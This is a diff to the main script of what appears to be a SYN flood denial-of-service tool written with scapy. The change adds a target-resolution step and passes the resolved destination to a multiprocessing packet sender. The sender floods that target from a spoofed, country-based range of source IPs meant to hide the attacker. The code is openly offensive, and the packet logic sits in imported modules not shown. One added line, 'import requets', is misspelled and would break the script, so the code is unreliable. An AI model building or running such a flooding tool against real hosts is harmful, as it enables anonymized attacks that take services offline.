@@ -3,17 +3,21 @@
 import multiprocessing
 from scapy.all import *	
 import socket
+import os
+import random
+import time
+import requets
 from userinputs_synflood import *
 from Ipchanging_synflood import *
 from definepacket_synflood import *
 from unanonymizedIP_synflood import *
-import os
-import random
-import time
+from proceedtarget_synflood import *
+
 
 yourIP = uanoIP()	
 supcountries = supcountries()
 destination = definetarget()
+destinationnew = proceedtarget(destination)
 targetport = defineporttarget()
 awnser_anonymizing = anonymizing_input(supcountries)
 
@@ -49,7 +53,7 @@ if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
 
 
 
-p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destination, targetport))
+p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destinationnew, targetport))
 p.start()
 p.join()
 
